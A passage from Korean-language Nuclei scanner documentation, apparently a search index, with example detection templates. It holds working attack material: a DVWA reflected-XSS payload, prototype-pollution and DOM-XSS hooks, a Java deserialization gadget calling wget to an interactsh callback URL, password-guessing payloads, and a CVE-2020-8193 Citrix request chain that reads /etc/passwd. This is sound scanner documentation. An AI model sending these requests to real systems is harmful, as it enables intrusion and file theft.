\uc2e4\ud589\ub41c \uacbd\uc6b0 \uc77c\uce58 \ud56d\ubaa9\uc744 \ubc18\ud658\ud569\ub2c8\ub2e4. id : dvwa-xss-verification info : name : DVWA Reflected XSS Verification author : pd-team severity : info headless : - steps : - args : url : \"{{BaseURL}}\" action : navigate - action : waitload # xss \uac10\uc9c0\ub97c \uc704\ud574 window.data\ub97c \uc7ac\uc815\uc758\ud558\ub3c4\ub85d \ud6c4\ud06c \uc124\uc815 - action : script args : hook : true code : \"(function() { window.alert = function() { window.data = 'found' } })()\" - args : by : x value : admin xpath : /html/body/div/div[2]/form/fieldset/input action : text - args : by : x value : password xpath : /html/body/div/div[2]/form/fieldset/input[2] action : text - args : by : x xpath : /html/body/div/div[2]/form/fieldset/p/input action : click - action : waitload - args : by : x xpath : /html/body/div/div[2]/div/ul[2]/li[11]/a action : click - action : waitload - args : by : x value : '\"><svg/onload=alert(1)>' xpath : /html/body/div/div[3]/div/div/form/p/input action : text - args : keys : \"\\r\" # \ud0a4\ubcf4\ub4dc\uc758 Enter \ud0a4\ub97c \ub204\ub985\ub2c8\ub2e4. action : keyboard - action : waitload - action : script name : alert args : code : \"window.data\" matchers : - part : alert type : word words : - \"found\" DOM XSS \uac10\uc9c0 \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 eval , innerHTML \ubc0f document.write \uc640 \uac19\uc740 \uacf5\ud1b5 \uc2f1\ud06c\ub97c \ud6c4\ud0b9\ud558\uc5ec window.name \uc18c\uc2a4\uc5d0 \ub300\ud55c DOM-XSS \uac10\uc9c0\ub97c \uc218\ud589\ud569\ub2c8\ub2e4. id : window-name-domxss info : name : window.name DOM XSS author : pd-team severity : medium headless : - steps : - action : setheader args : part : response key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" - action : script args : hook : true code : | (function() {window.alerts = []; function logger(found) { window.alerts.push(found); } function getStackTrace () { var stack; try { throw new Error(''); } catch (error) { stack = error.stack || ''; } stack = stack.split('\\n').map(function (line) { return line.trim(); }); return stack.splice(stack[0] == 'Error' ? 2 : 1); } window.name = \"{{randstr_1}}'\\\"<>\"; var oldEval = eval; var oldDocumentWrite = document.write; var setter = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set; Object.defineProperty(Element.prototype, 'innerHTML', { set: function innerHTML_Setter(val) { if (val.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'innerHTML', source: 'window.name', code: val, stack: getStackTrace()}); } return setter.call(this, val) } }); eval = function(data) { if (data.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'eval' ,source: 'window.name', code: data, stack: getStackTrace()}); } return oldEval.apply(this, arguments); }; document.write = function(data) { if (data.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'document.write' ,source: 'window.name', code: data, stack: getStackTrace()}); } return oldEval.apply(this, arguments); }; })(); - args : url : \"{{BaseURL}}\" action : navigate - action : waitload - action : script name : alerts args : code : \"window.alerts\" matchers : - type : word part : alerts words : - \"sink:\" extractors : - type : kval part : alerts kval : - alerts","title":"Headless"},{"location":"kr/template-examples/headless/#_1","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 \ud5e4\ub4dc\ub9ac\uc2a4 \ube0c\ub77c\uc6b0\uc800\uc758 URL\uc744 \ubc29\ubb38\ud558\uc5ec \ub85c\ub4dc\ub420 \ub54c\uae4c\uc9c0 \uae30\ub2e4\ub9bd\ub2c8\ub2e4. id : basic-headless-request info : name : Basic Headless Request author : pdteam severity : info headless : - steps : - action : navigate args : url : \"{{BaseURL}}\" - action : waitload","title":"\uae30\ubcf8 \ud5e4\ub4dc\ub9ac\uc2a4 \ud0d0\uc0c9 \uc608\uc2dc"},{"location":"kr/template-examples/headless/#_2","text":"\uc544\ub798 \ud15c\ud50c\ub9bf\uc740 Nuclei \ud5e4\ub4dc\ub9ac\uc2a4 \uae30\ub2a5\uc774 \uc788\ub294 \ud398\uc774\uc9c0\uc5d0\uc11c \ud504\ub85c\ud1a0\ud0c0\uc785 \uc624\uc5fc\uc744 \uac10\uc9c0\ud569\ub2c8\ub2e4. \ud0d0\uc9c0\ub97c \uc704\ud55c \ucf54\ub4dc\ub294 https://github.com/msrkp/PPScan \uc5d0\uc11c \uac00\uc838\uc654\uc2b5\ub2c8\ub2e4. \uc6b0\ub9ac\ub294 \ud575\uc758 \uc2a4\ud06c\ub9bd\ud2b8 \uc8fc\uc785 \uae30\ub2a5\uc744 \uc0ac\uc6a9\ud558\uc5ec \ud504\ub85c\ud1a0\ud0c0\uc785 \uc624\uc5fc\uc5d0 \ub300\ud55c \uc2e0\ub8b0\ud560 \uc218 \uc788\ub294 \ud0d0\uc9c0\ub97c \uc81c\uacf5\ud569\ub2c8\ub2e4. id : prototype-pollution-check info : name : Prototype Pollution Check author : pd-team severity : medium reference : https://github.com/msrkp/PPScan headless : - steps : - action : setheader args : part : response key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" - action : setheader args : part : response key : X-Frame-Options value : foo - action : setheader args : part : response key : If-None-Match value : foo # Set the hook to override window.data for xss detection - action : script args : hook : true code : | // Hooking code adapted from https://github.com/msrkp/PPScan/blob/main/scripts/content_script.js (function() {window.alerts = []; function logger(found) { window.alerts.push(found); } function check() { loc = location.href; if (loc.indexOf(\"e32a5ec9c99\") >= 0 && loc.search(\"a0def12bce\") == -1) { setTimeout(function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\") { logger(location.href); } var url = new URL(location.origin + location.pathname); url.hash = \"__proto__[a0def12bce]=ddcb362f1d60&__proto__.a0def12bce=ddcb362f1d60&dummy\"; location = url.href; }, 5 * 1000); } else if (loc.search(\"a0def12bce\") != -1) { setTimeout(function() { if (Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); } window.close(); }, 5 * 1000); } else { var url = new URL(loc); url.searchParams.append(\"__proto__[e32a5ec9c99]\", \"ddcb362f1d60\"); url.searchParams.append(\"__proto__.e32a5ec9c99\", \"ddcb362f1d60\"); location = url.href; } } window.onload = function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\" || Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); } else { check(); } }; var timerID = setInterval(function() { if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\" || Object.prototype.a0def12bce == \"ddcb362f1d60\") { logger(location.href); clearInterval(timerID); } }, 5 * 1000)})(); - args : url : \"{{BaseURL}}\" action : navigate - action : waitload - action : script name : alerts args : code : \"window.alerts\" matchers : - type : word part : alerts words : - \"__proto__\" extractors : - type : kval part : alerts kval : - alerts","title":"\ud5e4\ub4dc\ub9ac\uc2a4 \ud504\ub85c\ud1a0\ud0c0\uc785 \uc624\uc5fc \uac10\uc9c0"},{"location":"kr/template-examples/headless/#dvwa-xss","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 DVWA(Damn Vulnerable Web App)\uc5d0 \ub85c\uadf8\uc778\ud558\uace0 Reflected XSS\ub97c \uc790\ub3d9\uc73c\ub85c \uc7ac\ud604\ud558\ub824\uace0 \uc2dc\ub3c4\ud558\uba70 \ud398\uc774\ub85c\ub4dc\uac00 \uc131\uacf5\uc801\uc73c\ub85c \uc2e4\ud589\ub41c \uacbd\uc6b0 \uc77c\uce58 \ud56d\ubaa9\uc744 \ubc18\ud658\ud569\ub2c8\ub2e4. id : dvwa-xss-verification info : name : DVWA Reflected XSS Verification author : pd-team severity : info headless : - steps : - args : url : \"{{BaseURL}}\" action : navigate - action : waitload # xss \uac10\uc9c0\ub97c \uc704\ud574 window.data\ub97c \uc7ac\uc815\uc758\ud558\ub3c4\ub85d \ud6c4\ud06c \uc124\uc815 - action : script args : hook : true code : \"(function() { window.alert = function() { window.data = 'found' } })()\" - args : by : x value : admin xpath : /html/body/div/div[2]/form/fieldset/input action : text - args : by : x value : password xpath : /html/body/div/div[2]/form/fieldset/input[2] action : text - args : by : x xpath : /html/body/div/div[2]/form/fieldset/p/input action : click - action : waitload - args : by : x xpath : /html/body/div/div[2]/div/ul[2]/li[11]/a action : click - action : waitload - args : by : x value : '\"><svg/onload=alert(1)>' xpath : /html/body/div/div[3]/div/div/form/p/input action : text - args : keys : \"\\r\" # \ud0a4\ubcf4\ub4dc\uc758 Enter \ud0a4\ub97c \ub204\ub985\ub2c8\ub2e4. action : keyboard - action : waitload - action : script name : alert args : code : \"window.data\" matchers : - part : alert type : word words : - \"found\"","title":"\ud5e4\ub4dc\ub9ac\uc2a4 \ubaa8\ub4dc\ub85c DVWA XSS \uc7ac\ud604"},{"location":"kr/template-examples/headless/#dom-xss","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 eval , innerHTML \ubc0f document.write \uc640 \uac19\uc740 \uacf5\ud1b5 \uc2f1\ud06c\ub97c \ud6c4\ud0b9\ud558\uc5ec window.name \uc18c\uc2a4\uc5d0 \ub300\ud55c DOM-XSS \uac10\uc9c0\ub97c \uc218\ud589\ud569\ub2c8\ub2e4. id : window-name-domxss info : name : window.name DOM XSS author : pd-team severity : medium headless : - steps : - action : setheader args : part : response key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" - action : script args : hook : true code : | (function() {window.alerts = []; function logger(found) { window.alerts.push(found); } function getStackTrace () { var stack; try { throw new Error(''); } catch (error) { stack = error.stack || ''; } stack = stack.split('\\n').map(function (line) { return line.trim(); }); return stack.splice(stack[0] == 'Error' ? 2 : 1); } window.name = \"{{randstr_1}}'\\\"<>\"; var oldEval = eval; var oldDocumentWrite = document.write; var setter = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set; Object.defineProperty(Element.prototype, 'innerHTML', { set: function innerHTML_Setter(val) { if (val.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'innerHTML', source: 'window.name', code: val, stack: getStackTrace()}); } return setter.call(this, val) } }); eval = function(data) { if (data.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'eval' ,source: 'window.name', code: data, stack: getStackTrace()}); } return oldEval.apply(this, arguments); }; document.write = function(data) { if (data.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'document.write' ,source: 'window.name', code: data, stack: getStackTrace()}); } return oldEval.apply(this, arguments); }; })(); - args : url : \"{{BaseURL}}\" action : navigate - action : waitload - action : script name : alerts args : code : \"window.alerts\" matchers : - type : word part : alerts words : - \"sink:\" extractors : - type : kval part : alerts kval : - alerts","title":"DOM XSS \uac10\uc9c0"},{"location":"kr/template-examples/helper-functions/","text":"\ud568\uc218 \ub3c4\uc6b0\ubbf8 \uc608\uc2dc \u00b6 Nuclei\uc5d0\ub294 \uc694\uccad \ube14\ub85d\uc5d0\uc11c \ub2e4\uc591\ud55c \ub7f0\ud0c0\uc784 \uc791\uc5c5\uc744 \uc218\ud589\ud558\ub294 \ub370 \uc0ac\uc6a9\ud560 \uc218 \uc788\ub294 \uc5ec\ub7ec \ub3c4\uc6b0\ubbf8 \uae30\ub2a5\uc774 \uc788\uc2b5\ub2c8\ub2e4. \ub2e4\uc74c\uc740 \uc0ac\uc6a9 \uac00\ub2a5\ud55c \ubaa8\ub4e0 \ub3c4\uc6b0\ubbf8 \uae30\ub2a5\uc744 \uc0ac\uc6a9\ud558\ub294 \ubc29\ubc95\uc744 \ubcf4\uc5ec\uc8fc\ub294 \uc608\uc81c \ud15c\ud50c\ub9bf\uc785\ub2c8\ub2e4. id : helper-functions-examples info : name : RAW Template with Helper Functions author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} 01: {{base64(\"Hello\")}} 02: {{base64(1234)}} 03: {{base64_decode(\"SGVsbG8=\")}} 04: {{base64_py(\"Hello\")}} 05: {{compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1')}} 06: {{concat(\"Hello\", \"world\")}} 07: {{contains(\"Hello\", \"lo\")}} 08: {{date_time(\"%Y-%M-%D\")}} 09: {{date_time(\"%Y-%M-%D\", unix_time())}} 10: {{date_time(\"%H-%m\")}} 11: {{date_time(\"02-01-2006 15:04\")}} 12: {{date_time(\"02-01-2006 15:04\", unix_time())}} 13: {{dec_to_hex(11111)}} 14: {{generate_java_gadget(\"commons-collections3.1\", \"wget http://{{interactsh-url}}\", \"base64\")}} 15: {{gzip(\"Hello\")}} 16: {{gzip_decode(hex_decode(\"1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000\"))}} 17: {{hex_decode(\"6161\")}} 18: {{hex_encode(\"aa\")}} 19: {{hmac(\"sha1\", \"test\", \"scrt\")}} 20: {{hmac(\"sha256\", \"test\", \"scrt\")}} 21: {{html_escape(\"<body>test</body>\")}} 22: {{html_unescape(\"&lt;body&gt;test&lt;/body&gt;\")}} 23: {{join(\"_\", \"hello\", \"world\")}} 24: {{len(\"Hello\")}} 25: {{len(5555)}} 26: {{md5(\"Hello\")}} 27: {{md5(1234)}} 28: {{mmh3(\"Hello\")}} 29: {{print_debug(1+2, \"Hello\")}} 30: {{rand_base(5, \"abc\")}} 31: {{rand_base(5, \"\")}} 32: {{rand_base(5)}} 33: {{rand_char(\"abc\")}} 34: {{rand_char(\"\")}} 35: {{rand_char()}} 36: {{rand_int(1, 10)}} 37: {{rand_int(10)}} 38: {{rand_int()}} 39: {{rand_ip(\"192.168.0.0/24\")}} 40: {{rand_ip(\"2002:c0a8::/24\")}} 41: {{rand_ip(\"192.168.0.0/24\",\"10.0.100.0/24\")}} 42: {{rand_text_alpha(10, \"abc\")}} 43: {{rand_text_alpha(10, \"\")}} 44: {{rand_text_alpha(10)}} 45: {{rand_text_alphanumeric(10, \"ab12\")}} 46: {{rand_text_alphanumeric(10)}} 47: {{rand_text_numeric(10, 123)}} 48: {{rand_text_numeric(10)}} 49: {{regex(\"H([a-z]+)o\", \"Hello\")}} 50: {{remove_bad_chars(\"abcd\", \"bc\")}} 51: {{repeat(\"a\", 5)}} 52: {{replace(\"Hello\", \"He\", \"Ha\")}} 53: {{replace_regex(\"He123llo\", \"(\\\\d+)\", \"\")}} 54: {{reverse(\"abc\")}} 55: {{sha1(\"Hello\")}} 56: {{sha256(\"Hello\")}} 57: {{to_lower(\"HELLO\")}} 58: {{to_upper(\"hello\")}} 59: {{trim(\"aaaHelloddd\", \"ad\")}} 60: {{trim_left(\"aaaHelloddd\", \"ad\")}} 61: {{trim_prefix(\"aaHelloaa\", \"aa\")}} 62: {{trim_right(\"aaaHelloddd\", \"ad\")}} 63: {{trim_space(\" Hello \")}} 64: {{trim_suffix(\"aaHelloaa\", \"aa\")}} 65: {{unix_time(10)}} 66: {{url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\")}} 67: {{url_encode(\"https://projectdiscovery.io/test?a=1\")}} 68: {{wait_for(1)}} 69: {{zlib(\"Hello\")}} 70: {{zlib_decode(hex_decode(\"789cf248cdc9c907040000ffff058c01f5\"))}} 71: {{hex_encode(aes_gcm(\"AES256Key-32Characters1234567890\", \"exampleplaintext\"))}} 72: {{starts_with(\"Hello\", \"He\")}} 73: {{ends_with(\"Hello\", \"lo\")}} 74: {{line_starts_with(\"Hi\\nHello\", \"He\")}} 75: {{line_ends_with(\"Hello\\nHi\", \"lo\")}}","title":"Helper functions"},{"location":"kr/template-examples/helper-functions/#_1","text":"Nuclei\uc5d0\ub294 \uc694\uccad \ube14\ub85d\uc5d0\uc11c \ub2e4\uc591\ud55c \ub7f0\ud0c0\uc784 \uc791\uc5c5\uc744 \uc218\ud589\ud558\ub294 \ub370 \uc0ac\uc6a9\ud560 \uc218 \uc788\ub294 \uc5ec\ub7ec \ub3c4\uc6b0\ubbf8 \uae30\ub2a5\uc774 \uc788\uc2b5\ub2c8\ub2e4. \ub2e4\uc74c\uc740 \uc0ac\uc6a9 \uac00\ub2a5\ud55c \ubaa8\ub4e0 \ub3c4\uc6b0\ubbf8 \uae30\ub2a5\uc744 \uc0ac\uc6a9\ud558\ub294 \ubc29\ubc95\uc744 \ubcf4\uc5ec\uc8fc\ub294 \uc608\uc81c \ud15c\ud50c\ub9bf\uc785\ub2c8\ub2e4. id : helper-functions-examples info : name : RAW Template with Helper Functions author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} 01: {{base64(\"Hello\")}} 02: {{base64(1234)}} 03: {{base64_decode(\"SGVsbG8=\")}} 04: {{base64_py(\"Hello\")}} 05: {{compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1')}} 06: {{concat(\"Hello\", \"world\")}} 07: {{contains(\"Hello\", \"lo\")}} 08: {{date_time(\"%Y-%M-%D\")}} 09: {{date_time(\"%Y-%M-%D\", unix_time())}} 10: {{date_time(\"%H-%m\")}} 11: {{date_time(\"02-01-2006 15:04\")}} 12: {{date_time(\"02-01-2006 15:04\", unix_time())}} 13: {{dec_to_hex(11111)}} 14: {{generate_java_gadget(\"commons-collections3.1\", \"wget http://{{interactsh-url}}\", \"base64\")}} 15: {{gzip(\"Hello\")}} 16: {{gzip_decode(hex_decode(\"1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000\"))}} 17: {{hex_decode(\"6161\")}} 18: {{hex_encode(\"aa\")}} 19: {{hmac(\"sha1\", \"test\", \"scrt\")}} 20: {{hmac(\"sha256\", \"test\", \"scrt\")}} 21: {{html_escape(\"<body>test</body>\")}} 22: {{html_unescape(\"&lt;body&gt;test&lt;/body&gt;\")}} 23: {{join(\"_\", \"hello\", \"world\")}} 24: {{len(\"Hello\")}} 25: {{len(5555)}} 26: {{md5(\"Hello\")}} 27: {{md5(1234)}} 28: {{mmh3(\"Hello\")}} 29: {{print_debug(1+2, \"Hello\")}} 30: {{rand_base(5, \"abc\")}} 31: {{rand_base(5, \"\")}} 32: {{rand_base(5)}} 33: {{rand_char(\"abc\")}} 34: {{rand_char(\"\")}} 35: {{rand_char()}} 36: {{rand_int(1, 10)}} 37: {{rand_int(10)}} 38: {{rand_int()}} 39: {{rand_ip(\"192.168.0.0/24\")}} 40: {{rand_ip(\"2002:c0a8::/24\")}} 41: {{rand_ip(\"192.168.0.0/24\",\"10.0.100.0/24\")}} 42: {{rand_text_alpha(10, \"abc\")}} 43: {{rand_text_alpha(10, \"\")}} 44: {{rand_text_alpha(10)}} 45: {{rand_text_alphanumeric(10, \"ab12\")}} 46: {{rand_text_alphanumeric(10)}} 47: {{rand_text_numeric(10, 123)}} 48: {{rand_text_numeric(10)}} 49: {{regex(\"H([a-z]+)o\", \"Hello\")}} 50: {{remove_bad_chars(\"abcd\", \"bc\")}} 51: {{repeat(\"a\", 5)}} 52: {{replace(\"Hello\", \"He\", \"Ha\")}} 53: {{replace_regex(\"He123llo\", \"(\\\\d+)\", \"\")}} 54: {{reverse(\"abc\")}} 55: {{sha1(\"Hello\")}} 56: {{sha256(\"Hello\")}} 57: {{to_lower(\"HELLO\")}} 58: {{to_upper(\"hello\")}} 59: {{trim(\"aaaHelloddd\", \"ad\")}} 60: {{trim_left(\"aaaHelloddd\", \"ad\")}} 61: {{trim_prefix(\"aaHelloaa\", \"aa\")}} 62: {{trim_right(\"aaaHelloddd\", \"ad\")}} 63: {{trim_space(\" Hello \")}} 64: {{trim_suffix(\"aaHelloaa\", \"aa\")}} 65: {{unix_time(10)}} 66: {{url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\")}} 67: {{url_encode(\"https://projectdiscovery.io/test?a=1\")}} 68: {{wait_for(1)}} 69: {{zlib(\"Hello\")}} 70: {{zlib_decode(hex_decode(\"789cf248cdc9c907040000ffff058c01f5\"))}} 71: {{hex_encode(aes_gcm(\"AES256Key-32Characters1234567890\", \"exampleplaintext\"))}} 72: {{starts_with(\"Hello\", \"He\")}} 73: {{ends_with(\"Hello\", \"lo\")}} 74: {{line_starts_with(\"Hi\\nHello\", \"He\")}} 75: {{line_ends_with(\"Hello\\nHi\", \"lo\")}}","title":"\ud568\uc218 \ub3c4\uc6b0\ubbf8 \uc608\uc2dc"},{"location":"kr/template-examples/http-fuzzing/","text":"HTTP Intruder fuzzing \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 'clusterbomb' Intruder\ub97c \uc2e4\ud589\ud558\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud558\ub294 \ud15c\ud50c\ub9bf \uc815\uc758 \ud398\uc774\ub85c\ub4dc\uc640 \ud568\uaed8 RAW \ud615\uc2dd\uc73c\ub85c \uc815\uc758\ub41c POST \uc694\uccad\uc744 \ub9cc\ub4ed\ub2c8\ub2e4. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info # \ud15c\ud50c\ub9bf \ud398\uc774\ub85c\ub4dc \uc9c0\uc6d0\uc73c\ub85c HTTP Intruder fuzzing. http : - raw : - | POST /?username=\u00a7username\u00a7&paramb=\u00a7password\u00a7 HTTP/1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) Host: {{Hostname}} another_header: {{base64('\u00a7password\u00a7')}} Accept: */* body=test payloads : username : - admin password : - admin - guest - password - test - 12345 - 123456 attack : clusterbomb # Available: batteringram,pitchfork,clusterbomb matchers : - type : word words : - \"Test is test matcher text\" \uc5ec\ub7ec \uc694\uccad fuzzing \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 'clusterbomb' Intruder\ub97c \uc2e4\ud589\ud558\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud558\ub294 \ub2e8\uc5b4 \ubaa9\ub85d \uae30\ubc18 \ud398\uc774\ub85c\ub4dc\uc640 \ud568\uaed8 RAW \ud615\uc2dd\uc73c\ub85c \uc815\uc758\ub41c POST \uc694\uccad\uc744 \ub9cc\ub4ed\ub2c8\ub2e4. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | POST /?param_a=\u00a7param_a\u00a7&paramb=\u00a7param_b\u00a7 HTTP/1.1 User-Agent: \u00a7param_a\u00a7 Host: {{Hostname}} another_header: {{base64('\u00a7param_b\u00a7')}} Accept: */* admin=test - | DELETE / HTTP/1.1 User-Agent: nuclei Host: {{Hostname}} {{sha256('\u00a7param_a\u00a7')}} - | PUT / HTTP/1.1 Host: {{Hostname}} {{html_escape('\u00a7param_a\u00a7')}} + {{hex_encode('\u00a7param_b\u00a7'))}} attack : clusterbomb # Available types: batteringram,pitchfork,clusterbomb payloads : param_a : payloads/prams.txt param_b : payloads/paths.txt matchers : - type : word words : - \"Test is test matcher text\" \uc778\uc99d\uc774 \ud544\uc694\ud55c fuzzing \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 \uac01 \uc694\uccad \uac04\uc758 \uc138\uc158\uc744 \uc720\uc9c0 \uad00\ub9ac\ud558\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud558\ub294 \uc815\uc758\ub41c \uc694\uccad\uc73c\ub85c \ud6c4\uc18d HTTP \uc694\uccad\uc744 \ub9cc\ub4ed\ub2c8\ub2e4. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} testing=parameter cookie-reuse : true # \ucfe0\ud0a4 \uc7ac\uc0ac\uc6a9\uc740 \ube0c\ub77c\uc6b0\uc800\uc640 \uac19\uc740 \ubaa8\ub4e0 \uc694\uccad \uac04\uc758 \uc138\uc158\uc744 \uc720\uc9c0\ud569\ub2c8\ub2e4. matchers : - type : word words : - \"Test is test matcher text\" \ub3d9\uc801 \ubcc0\uc218 \uc9c0\uc6d0 \u00b6 \uc774 \ud15c\ud50c\ub9bf\uc740 \uac01 \uc694\uccad \uac04\uc5d0 \uc138\uc158\uc744 \uc720\uc9c0 \uad00\ub9ac\ud558\ub294 \uc5f0\uc18d\uc801\uc778 HTTP \uc694\uccad\uc744 \ub9cc\ub4ed\ub2c8\ub2e4. \uc694\uccad\uc5d0\uc11c \ub370\uc774\ud130\ub97c \ub3d9\uc801\uc73c\ub85c \ucd94\ucd9c\ud558\uace0 \ubcc0\uc218 \uc774\ub984\uc744 \uc0ac\uc6a9\ud558\uc5ec \ub2e4\ub978 \uc694\uccad\uc73c\ub85c \uc7ac\uc0ac\uc6a9\ud55c \ub2e4\uc74c, \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud569\ub2c8\ub2e4. id : CVE-2020-8193 info : name : Citrix unauthenticated LFI author : pdteam severity : high reference : https://github.com/jas502n/CVE-2020-8193 http : - raw : - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Content-Type: application/xml X-NITRO-USER: xpyZxwy6 X-NITRO-PASS: xWXHUJ56 <appfwprofile><login></login></appfwprofile> - | GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/neo HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/stc HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <appfwprofile><login></login></appfwprofile> - | POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <clipermission></clipermission> cookie-reuse : true # Using cookie-reuse to maintain session between each request, same as browser. extractors : - type : regex name : randkey # Variable name part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" matchers : - type : regex regex : - \"root:[x*]:0:0:\" part : body","title":"Http fuzzing"},{"location":"kr/template-examples/http-fuzzing/#http-intruder-fuzzing","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 'clusterbomb' Intruder\ub97c \uc2e4\ud589\ud558\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud558\ub294 \ud15c\ud50c\ub9bf \uc815\uc758 \ud398\uc774\ub85c\ub4dc\uc640 \ud568\uaed8 RAW \ud615\uc2dd\uc73c\ub85c \uc815\uc758\ub41c POST \uc694\uccad\uc744 \ub9cc\ub4ed\ub2c8\ub2e4. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info # \ud15c\ud50c\ub9bf \ud398\uc774\ub85c\ub4dc \uc9c0\uc6d0\uc73c\ub85c HTTP Intruder fuzzing. http : - raw : - | POST /?username=\u00a7username\u00a7&paramb=\u00a7password\u00a7 HTTP/1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) Host: {{Hostname}} another_header: {{base64('\u00a7password\u00a7')}} Accept: */* body=test payloads : username : - admin password : - admin - guest - password - test - 12345 - 123456 attack : clusterbomb # Available: batteringram,pitchfork,clusterbomb matchers : - type : word words : - \"Test is test matcher text\"","title":"HTTP Intruder fuzzing"},{"location":"kr/template-examples/http-fuzzing/#fuzzing","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 'clusterbomb' Intruder\ub97c \uc2e4\ud589\ud558\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud558\ub294 \ub2e8\uc5b4 \ubaa9\ub85d \uae30\ubc18 \ud398\uc774\ub85c\ub4dc\uc640 \ud568\uaed8 RAW \ud615\uc2dd\uc73c\ub85c \uc815\uc758\ub41c POST \uc694\uccad\uc744 \ub9cc\ub4ed\ub2c8\ub2e4. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info http : - raw : - | POST /?param_a=\u00a7param_a\u00a7&paramb=\u00a7param_b\u00a7 HTTP/1.1 User-Agent: \u00a7param_a\u00a7 Host: {{Hostname}} another_header: {{base64('\u00a7param_b\u00a7')}} Accept: */* admin=test - | DELETE / HTTP/1.1 User-Agent: nuclei Host: {{Hostname}} {{sha256('\u00a7param_a\u00a7')}} - | PUT / HTTP/1.1 Host: {{Hostname}} {{html_escape('\u00a7param_a\u00a7')}} + {{hex_encode('\u00a7param_b\u00a7'))}} attack : clusterbomb # Available types: batteringram,pitchfork,clusterbomb payloads : param_a : payloads/prams.txt param_b : payloads/paths.txt matchers : - type : word words : - \"Test is test matcher text\"","title":"\uc5ec\ub7ec \uc694\uccad fuzzing"},{"location":"kr/template-examples/http-fuzzing/#fuzzing_1","text":"\uc774 \ud15c\ud50c\ub9bf\uc740 \uac01 \uc694\uccad \uac04\uc758 \uc138\uc158\uc744 \uc720\uc9c0 \uad00\ub9ac\ud558\uace0 \uc751\ub2f5\uc5d0 \ub300\ud55c \ubb38\uc790\uc5f4 \uc77c\uce58\ub97c \ud655\uc778\ud558\ub294 \uc815\uc758\ub41c \uc694\uccad\uc73c\ub85c \ud6c4\uc18d HTTP \uc694\uccad\uc744 \ub9cc\ub4ed\ub2c8\ub2e4. id : 